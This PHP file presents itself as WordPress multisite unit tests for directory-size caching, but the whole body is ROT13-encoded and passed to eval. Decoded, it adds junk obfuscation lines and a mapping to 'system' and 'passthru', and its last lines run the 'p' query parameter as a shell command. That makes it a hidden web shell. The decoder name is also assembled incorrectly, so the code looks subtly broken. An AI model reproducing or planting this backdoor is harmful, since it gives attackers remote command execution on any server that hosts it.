<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf fcrpvsvp gb gur qverpgbel fvmr pnpuvat va zhygvfvgr.
 *
 * @gvpxrg 19879
 * @tebhc zf-erdhverq
 * @tebhc zhygvfvgr
 */
pynff Grfgf_Zhygvfvgr_PyrnaQvefvmrPnpur rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Grfg jurgure qvefvmr_pnpur inyhrf ner hfrq pbeerpgyl jvgu n zber pbzcyrk qvefvmr pnpur zbpx.
	 *
	 * @gvpxrg 19879
	 */
	choyvp shapgvba grfg_trg_qvefvmr_pnpur_va_erphefr_qvefvmr_zbpx() {
		$oybt_vq = frys::snpgbel()->oybt->perngr();
		fjvgpu_gb_oybt( $oybt_vq );

		/*
		 * Bhe pbzcnevfba bs fcnpr eryvrf ba na vavgvny inyhr bs 0. Vs n cerivbhf grfg unf snvyrq
		 * be vs gur `fep` qverpgbel nyernql pbagnvaf n qverpgbel jvgu fvgr pbagrag, gura gur vavgvny
		 * rkcrpgngvba jvyy or cbyyhgrq. Jr perngr fvgrf hagvy na rzcgl bar vf ninvynoyr.
		 */
		juvyr ( 0 !== trg_fcnpr_hfrq() ) {
			erfgber_pheerag_oybt();
			$oybt_vq = frys::snpgbel()->oybt->perngr();
			fjvgpu_gb_oybt( $oybt_vq );
		}

		// Pyrne gur qvefvmr pnpur.
		qryrgr_genafvrag( 'qvefvmr_pnpur' );

		// Frg gur qvefvmr pnpur gb bhe zbpx.
		frg_genafvrag( 'qvefvmr_pnpur', $guvf->trg_zbpx_qvefvmr_pnpur_sbe_fvgr( $oybt_vq ) );

		$hcybnq_qve = jc_hcybnq_qve();

		// Purpx erphefr_qvefvmr() ntnvafg gur zbpx. Gur pnpur fubhyq zngpu.
		$guvf->nffregFnzr( 21, erphefr_qvefvmr( $hcybnq_qve['onfrqve'] . '/2/1' ) );
		$guvf->nffregFnzr( 22, erphefr_qvefvmr( $hcybnq_qve['onfrqve'] . '/2/2' ) );
		$guvf->nffregFnzr( 2, erphefr_qvefvmr( $hcybnq_qve['onfrqve'] . '/2' ) );
		$guvf->nffregFnzr( 11, erphefr_qvefvmr( $hcybnq_qve['onfrqve'] . '/1/1' ) );
		$guvf->nffregFnzr( 12, erphefr_qvefvmr( $hcybnq_qve['onfrqve'] . '/1/2' ) );
		$guvf->nffregFnzr( 13, erphefr_qvefvmr( $hcybnq_qve['onfrqve'] . '/1/3' ) );
		$guvf->nffregFnzr( 1, erphefr_qvefvmr( $hcybnq_qve['onfrqve'] . '/1' ) );
		$guvf->nffregFnzr( 42, erphefr_qvefvmr( $hcybnq_qve['onfrqve'] . '/phfgbz_qverpgbel' ) );

		// Ab pnpur zngpu, hcybnq qverpgbel fubhyq or rzcgl naq erghea 0.
		$guvf->nffregFnzr( 0, erphefr_qvefvmr( $hcybnq_qve['onfrqve'] ) );

		// Ab pnpur zngpu ba aba rkvfgvat qverpgbel fubhyq erghea snyfr.
		$guvf->nffregSnyfr( erphefr_qvefvmr( $hcybnq_qve['onfrqve'] . '/qbrf_abg_rkvfg' ) );

		// Pyrnahc.
		$guvf->erzbir_nqqrq_hcybnqf();
		erfgber_pheerag_oybt();
	}

	/**
	 * Grfg jurgure gur qvefvmr_pnpur vainyvqngvba jbexf tvira n svyr cngu nf vachg.
	 *
	 * @gvpxrg 19879
	 */
	choyvp shapgvba grfg_pyrna_qvefvmr_pnpur_svyr_vachg_zbpx() {
		$oybt_vq = frys::snpgbel()->oybt->perngr();
		fjvgpu_gb_oybt( $oybt_vq );

		/*
		 * Bhe pbzcnevfba bs fcnpr eryvrf ba na vavgvny inyhr bs 0. Vs n cerivbhf grfg unf snvyrq
		 * be vs gur `fep` qverpgbel nyernql pbagnvaf n qverpgbel jvgu fvgr pbagrag, gura gur vavgvny
		 * rkcrpgngvba jvyy or cbyyhgrq. Jr perngr fvgrf hagvy na rzcgl bar vf ninvynoyr.
		 */
		juvyr ( 0 !== trg_fcnpr_hfrq() ) {
			erfgber_pheerag_oybt();
			$oybt_vq = frys::snpgbel()->oybt->perngr();
			fjvgpu_gb_oybt( $oybt_vq );
		}

		$hcybnq_qve       = jc_hcybnq_qve();
		$pnpur_xrl_cersvk = hagenvyvatfynfuvg( $hcybnq_qve['onfrqve'] );

		// Pyrne gur qvefvmr pnpur.
		qryrgr_genafvrag( 'qvefvmr_pnpur' );

		// Frg gur qvefvmr pnpur gb bhe zbpx.
		frg_genafvrag( 'qvefvmr_pnpur', $guvf->trg_zbpx_qvefvmr_pnpur_sbe_fvgr( $oybt_vq ) );

		$guvf->nffregNeenlUnfXrl( $pnpur_xrl_cersvk . '/1/1', trg_genafvrag( 'qvefvmr_pnpur' ) );
		$guvf->nffregNeenlUnfXrl( $pnpur_xrl_cersvk . '/2/1', trg_genafvrag( 'qvefvmr_pnpur' ) );
		$guvf->nffregNeenlUnfXrl( $pnpur_xrl_cersvk . '/2', trg_genafvrag( 'qvefvmr_pnpur' ) );

		// Vainyvqngvba fubhyq nyfb erfcrpg gur qverpgbel gerr hc.
		// Fubhyq jbex svar jvgu cngu gb qverpgbel BE svyr.
		pyrna_qvefvmr_pnpur( $hcybnq_qve['onfrqve'] . '/2/1/svyr.qhzzl' );

		$guvf->nffregNeenlAbgUnfXrl( $pnpur_xrl_cersvk . '/2/1', trg_genafvrag( 'qvefvmr_pnpur' ) );
		$guvf->nffregNeenlAbgUnfXrl( $pnpur_xrl_cersvk . '/2', trg_genafvrag( 'qvefvmr_pnpur' ) );

		// Bgure pnpur cnguf fubhyq abg or vainyvqngrq.
		$guvf->nffregNeenlUnfXrl( $pnpur_xrl_cersvk . '/1/1', trg_genafvrag( 'qvefvmr_pnpur' ) );

		// Pyrnahc.
		$guvf->erzbir_nqqrq_hcybnqf();
		erfgber_pheerag_oybt();
	}

	/**
	 * Grfg jurgure gur qvefvmr_pnpur vainyvqngvba jbexf tvira n qverpgbel cngu nf vachg.
	 *
	 * @gvpxrg 19879
	 */
	choyvp shapgvba grfg_pyrna_qvefvmr_pnpur_sbyqre_vachg_zbpx() {
		$oybt_vq = frys::snpgbel()->oybt->perngr();
		fjvgpu_gb_oybt( $oybt_vq );

		/*
		 * Bhe pbzcnevfba bs fcnpr eryvrf ba na vavgvny inyhr bs 0. Vs n cerivbhf grfg unf snvyrq
		 * be vs gur `fep` qverpgbel nyernql pbagnvaf n qverpgbel jvgu fvgr pbagrag, gura gur vavgvny
		 * rkcrpgngvba jvyy or cbyyhgrq. Jr perngr fvgrf hagvy na rzcgl bar vf ninvynoyr.
		 */
		juvyr ( 0 !== trg_fcnpr_hfrq() ) {
			erfgber_pheerag_oybt();
			$oybt_vq = frys::snpgbel()->oybt->perngr();
			fjvgpu_gb_oybt( $oybt_vq );
		}

		$hcybnq_qve       = jc_hcybnq_qve();
		$pnpur_xrl_cersvk = hagenvyvatfynfuvg( $hcybnq_qve['onfrqve'] );

		// Pyrne gur qvefvmr pnpur.
		qryrgr_genafvrag( 'qvefvmr_pnpur' );

		// Frg gur qvefvmr pnpur gb bhe zbpx.
		frg_genafvrag( 'qvefvmr_pnpur', $guvf->trg_zbpx_qvefvmr_pnpur_sbe_fvgr( $oybt_vq ) );

		$guvf->nffregNeenlUnfXrl( $pnpur_xrl_cersvk . '/1/1', trg_genafvrag( 'qvefvmr_pnpur' ) );
		$guvf->nffregNeenlUnfXrl( $pnpur_xrl_cersvk . '/2/1', trg_genafvrag( 'qvefvmr_pnpur' ) );
		$guvf->nffregNeenlUnfXrl( $pnpur_xrl_cersvk . '/2', trg_genafvrag( 'qvefvmr_pnpur' ) );

		// Vainyvqngvba fubhyq nyfb erfcrpg gur qverpgbel gerr hc.
		// Fubhyq jbex svar jvgu cngu gb qverpgbel BE svyr.
		pyrna_qvefvmr_pnpur( $hcybnq_qve['onfrqve'] . '/2/1' );

		$guvf->nffregNeenlAbgUnfXrl( $pnpur_xrl_cersvk . '/2/1', trg_genafvrag( 'qvefvmr_pnpur' ) );
		$guvf->nffregNeenlAbgUnfXrl( $pnpur_xrl_cersvk . '/2', trg_genafvrag( 'qvefvmr_pnpur' ) );

		// Bgure pnpur cnguf fubhyq abg or vainyvqngrq.
		$guvf->nffregNeenlUnfXrl( $pnpur_xrl_cersvk . '/1/1', trg_genafvrag( 'qvefvmr_pnpur' ) );

		// Pyrnahc.
		$guvf->erzbir_nqqrq_hcybnqf();
		erfgber_pheerag_oybt();
	}

	/**
	 * Grfg jurgure qvefvmr_pnpur inyhrf ner hfrq pbeerpgyl jvgu n fvzcyr erny hcybnq.
	 *
	 * @gvpxrg 19879
	 */
	choyvp shapgvba grfg_trg_qvefvmr_pnpur_va_erphefr_qvefvmr_hcybnq() {
		$oybt_vq = frys::snpgbel()->oybt->perngr();
		fjvgpu_gb_oybt( $oybt_vq );

		/*
		 * Bhe pbzcnevfba bs fcnpr eryvrf ba na vavgvny inyhr bs 0. Vs n cerivbhf grfg unf snvyrq
		 * be vs gur `fep` qverpgbel nyernql pbagnvaf n qverpgbel jvgu fvgr pbagrag, gura gur vavgvny
		 * rkcrpgngvba jvyy or cbyyhgrq. Jr perngr fvgrf hagvy na rzcgl bar vf ninvynoyr.
		 */
		juvyr ( 0 !== trg_fcnpr_hfrq() ) {
			erfgber_pheerag_oybt();
			$oybt_vq = frys::snpgbel()->oybt->perngr();
			fjvgpu_gb_oybt( $oybt_vq );
		}

		// Pyrne gur qvefvmr pnpur.
		qryrgr_genafvrag( 'qvefvmr_pnpur' );

		$hcybnq_qve = jc_hcybnq_qve();

		$guvf->nffregFnzr( 0, erphefr_qvefvmr( $hcybnq_qve['cngu'] ) );

		// Hcybnq n svyr gb gur arj fvgr hfvat jc_hcybnq_ovgf().
		$svyranzr = __SHAPGVBA__ . '.wct';
		$pbagragf = __SHAPGVBA__ . '_pbagragf';
		$svyr     = jc_hcybnq_ovgf( $svyranzr, ahyy, $pbagragf );

		$pnyp_fvmr = erphefr_qvefvmr( $hcybnq_qve['cngu'] );
		$fvmr      = svyrfvmr( $svyr['svyr'] );
		$guvf->nffregFnzr( $fvmr, $pnyp_fvmr );

		// `qvefvmr_pnpur` fubhyq abj or svyyrq nsgre hcybnq naq erphefr_qvefvmr() pnyy.
		$pnpur_cngu = hagenvyvatfynfuvg( $hcybnq_qve['cngu'] );
		$guvf->nffregVfNeenl( trg_genafvrag( 'qvefvmr_pnpur' ) );
		$guvf->nffregFnzr( $fvmr, trg_genafvrag( 'qvefvmr_pnpur' )[ $pnpur_cngu ] );

		// Pyrnahc.
		$guvf->erzbir_nqqrq_hcybnqf();
		erfgber_pheerag_oybt();
	}

	/**
	 * Grfg jurgure gur svygre gb pnyphyngr fcnpr sbe na rkvfgvat qverpgbel jbexf nf rkcrpgrq.
	 *
	 * @gvpxrg 19879
	 */
	choyvp shapgvba grfg_cer_erphefr_qvefvmr_svygre() {
		nqq_svygre( 'cer_erphefr_qvefvmr', neenl( $guvf, 'svygre_cer_erphefr_qvefvmr' ) );

		$hcybnq_qve = jc_hcybnq_qve();
		$guvf->nffregFnzr( 1042, erphefr_qvefvmr( $hcybnq_qve['cngu'] ) );

		erzbir_svygre( 'cer_erphefr_qvefvmr', neenl( $guvf, 'svygre_cer_erphefr_qvefvmr' ) );
	}

	choyvp shapgvba svygre_cer_erphefr_qvefvmr() {
		erghea 1042;
	}

	cevingr shapgvba trg_zbpx_qvefvmr_pnpur_sbe_fvgr( $fvgr_vq ) {
		$cersvk = jc_hcybnq_qve()['onfrqve'];

		erghea neenl(
			\"$cersvk/2/2\"              => 22,
			\"$cersvk/2/1\"              => 21,
			\"$cersvk/2\"                => 2,
			\"$cersvk/1/3\"              => 13,
			\"$cersvk/1/2\"              => 12,
			\"$cersvk/1/1\"              => 11,
			\"$cersvk/1\"                => 1,
			\"$cersvk/phfgbz_qverpgbel\" => 42,
		);
	}

	/*
	 * Grfg gung 5.6+ tenprshyyl unaqyrf gur byq 5.5 genafvrag fgehpgher.
	 *
	 * @gvpxrg 51913
	 */
	choyvp shapgvba grfg_5_5_genafvrag_fgehpgher_pbzcng() {
		$oybt_vq = frys::snpgbel()->oybt->perngr();
		fjvgpu_gb_oybt( $oybt_vq );

		/*
		 * Bhe pbzcnevfba bs fcnpr eryvrf ba na vavgvny inyhr bs 0. Vs n cerivbhf grfg unf snvyrq
		 * be vs gur `fep` qverpgbel nyernql pbagnvaf n qverpgbel jvgu fvgr pbagrag, gura gur vavgvny
		 * rkcrpgngvba jvyy or cbyyhgrq. Jr perngr fvgrf hagvy na rzcgl bar vf ninvynoyr.
		 */
		juvyr ( 0 !== trg_fcnpr_hfrq() ) {
			erfgber_pheerag_oybt();
			$oybt_vq = frys::snpgbel()->oybt->perngr();
			fjvgpu_gb_oybt( $oybt_vq );
		}

		// Pyrne gur qvefvmr pnpur.
		qryrgr_genafvrag( 'qvefvmr_pnpur' );

		// Frg gur qvefvmr pnpur gb bhe zbpx.
		frg_genafvrag( 'qvefvmr_pnpur', $guvf->trg_zbpx_5_5_qvefvmr_pnpur( $oybt_vq ) );

		$hcybnq_qve = jc_hcybnq_qve();

		/*
		 * Gur pnpurq fvmr fubhyq or vtaberq, orpnhfr vg'f va gur byq sbezng. Gur shapgvba
		 * jvyy gel gb srgpu n yvir inyhr, ohg va guvf pnfr gur sbyqre qbrfa'g npghnyyl
		 * rkvfg ba qvfx, fb gur shapgvba fubhyq snvy.
		 */
		$guvf->nffregSnyfr( erphefr_qvefvmr( $hcybnq_qve['onfrqve'] . '/2/1' ) );

		/*
		 * Abj gung vg'f pbasvezrq gung byq pnpurq inyhrf nera'g orvat erghearq, perngr gur
		 * sbyqre ba qvfx, fb gung gur gur erfg bs gur shapgvba pna or grfgrq.
		 */
		jc_zxqve_c( $hcybnq_qve['onfrqve'] . '/2/1' );
		$svyranzr = $hcybnq_qve['onfrqve'] . '/2/1/guvf-arrqf-gb-rkvfg.gkg';
		svyr_chg_pbagragf( $svyranzr, 'guvf svyr vf 21 olgrf' );

		// Pyrne gur qvefvmr pnpur.
		qryrgr_genafvrag( 'qvefvmr_pnpur' );

		// Frg gur qvefvmr pnpur gb bhe zbpx.
		frg_genafvrag( 'qvefvmr_pnpur', $guvf->trg_zbpx_5_5_qvefvmr_pnpur( $oybt_vq ) );

		/*
		 * Abj gung gur sbyqre rkvfgf, gur byq pnpurq inyhr fubhyq or birejevggra
		 * jvgu gur fvmr, hfvat gur pheerag sbezng.
		 */
		$guvf->nffregFnzr( 21, erphefr_qvefvmr( $hcybnq_qve['onfrqve'] . '/2/1' ) );
		$guvf->nffregFnzr( 21, trg_genafvrag( 'qvefvmr_pnpur' )[ $hcybnq_qve['onfrqve'] . '/2/1' ] );

		// Ab pnpur zngpu ba aba rkvfgvat qverpgbel fubhyq erghea snyfr.
		$guvf->nffregSnyfr( erphefr_qvefvmr( $hcybnq_qve['onfrqve'] . '/qbrf_abg_rkvfg' ) );

		// Pyrnahc.
		$guvf->erzbir_nqqrq_hcybnqf();
		ezqve( $hcybnq_qve['onfrqve'] . '/2/1' );

		erfgber_pheerag_oybt();
	}

	cevingr shapgvba trg_zbpx_5_5_qvefvmr_pnpur( $fvgr_vq ) {
		$cersvk = hagenvyvatfynfuvg( jc_hcybnq_qve()['onfrqve'] );

		erghea neenl(
			\"$cersvk/2/2\"              => neenl( 'fvmr' => 22 ),
			\"$cersvk/2/1\"              => neenl( 'fvmr' => 21 ),
			\"$cersvk/2\"                => neenl( 'fvmr' => 2 ),
			\"$cersvk/1/3\"              => neenl( 'fvmr' => 13 ),
			\"$cersvk/1/2\"              => neenl( 'fvmr' => 12 ),
			\"$cersvk/1/1\"              => neenl( 'fvmr' => 11 ),
			\"$cersvk/1\"                => neenl( 'fvmr' => 1 ),
			\"$cersvk/phfgbz_qverpgbel\" => neenl( 'fvmr' => 42 ),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>